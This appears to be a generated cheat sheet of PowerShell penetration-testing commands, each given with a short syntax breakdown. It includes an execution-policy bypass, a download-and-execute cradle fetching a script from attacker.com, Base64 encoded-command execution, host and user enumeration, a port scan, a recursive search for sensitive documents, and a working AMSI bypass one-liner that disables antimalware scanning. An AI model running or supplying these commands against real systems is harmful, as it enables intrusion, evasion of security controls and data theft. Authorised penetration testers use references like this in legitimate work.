# Windows Penetration

_1 tool command_

### PowerShell Penetration Commands  `powershell-pentest`
_Common commands for PowerShell penetration testing_

**Step 0**
> Bypass the execution policy to run a script
_platform: windows_
```
powershell -ExecutionPolicy Bypass -File script.ps1
```
**Syntax breakdown:**
- `-ExecutionPolicy Bypass` — Bypass the execution policy _parameter_

**Step 0**
> Download and execute a script from a remote host
_platform: windows_
```
IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")
```
**Syntax breakdown:**
- `IEX` — Invoke-Expression, executes a string _command_
- `Net.WebClient` — Web client class _value_
- `DownloadString` — Downloads string content _value_

**Step 0**
> Execute a command using Base64 encoding
_platform: windows_
```
powershell -EncodedCommand BASE64_ENCODED_COMMAND
```
**Syntax breakdown:**
- `-EncodedCommand` — Base64-encoded command _parameter_

**Step 0**
> Get system information
_platform: windows_
```
Get-ComputerInfo
systeminfo
Get-WmiObject -Class Win32_OperatingSystem
```

**Step 0**
> Get running processes
_platform: windows_
```
Get-Process | Select-Object Name,Id,Path
Get-WmiObject Win32_Process | Select-Object Name,ProcessId,CommandLine
```

**Step 0**
> Get service information
_platform: windows_
```
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-WmiObject Win32_Service | Select-Object Name,State,StartName
```

**Step 0**
> Get network connections
_platform: windows_
```
Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,OwningProcess
netstat -ano
```

**Step 0**
> Get user information
_platform: windows_
```
Get-LocalUser
net user
net localgroup administrators
```

**Step 0**
> Simple port scan
_platform: windows_
```
1..1024 | % {Test-NetConnection -Port $_ -ComputerName target_ip}
```

**Step 0**
> Search for sensitive files
_platform: windows_
```
Get-ChildItem -Path C:\ -Include *.txt,*.doc,*.xls -Recurse -ErrorAction SilentlyContinue
```

**Step 0**
> Bypass AMSI detection
_platform: windows_
```
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
```

---
